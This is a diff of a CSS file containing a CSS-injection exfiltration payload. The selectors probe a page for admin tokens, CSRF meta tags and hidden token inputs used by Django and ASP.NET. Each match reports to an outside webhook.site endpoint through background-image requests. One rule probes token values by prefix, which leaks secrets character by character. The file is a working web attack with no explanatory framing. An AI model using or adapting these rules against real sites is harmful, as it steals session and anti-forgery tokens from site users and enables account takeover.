@@ -1,1 +1,11 @@
-@import url(https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c?loaded=1);
+/* meta tokens used by common frameworks */
+html:has(meta[name="admin-token"])      { background-image: url(https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c?found=admin-token) }
+html:has(meta[name="csrf-token"])       { background-image: url(https://webhook.site/YOUR_ID?found=csrf-token)  }
+html:has(meta[name="csrf-param"])       { background-image: url(https://webhook.site/YOUR_ID?found=csrf-param)  }
+html:has(meta[name="x-csrf-token"])     { background-image: url(https://webhook.site/YOUR_ID?found=x-csrf-token) }
+
+/* hidden inputs */
+html:has(input[type="hidden"][name*="token"])                { background-image: url(https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c?found=hidden-token) }
+html:has(input[type="hidden"][name="csrfmiddlewaretoken"])   { background-image: url(https://webhook.site/YOUR_ID?found=django) }
+html:has(input[type="hidden"][name="__RequestVerificationToken"]) { background-image: url(https://webhook.site/YOUR_ID?found=aspnet) }
+html:has(input[type="hidden"][name="csrfmiddlewaretoken"][value^="PREFIX0"]) { background-image: url(https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c?next=PREFIX0) }
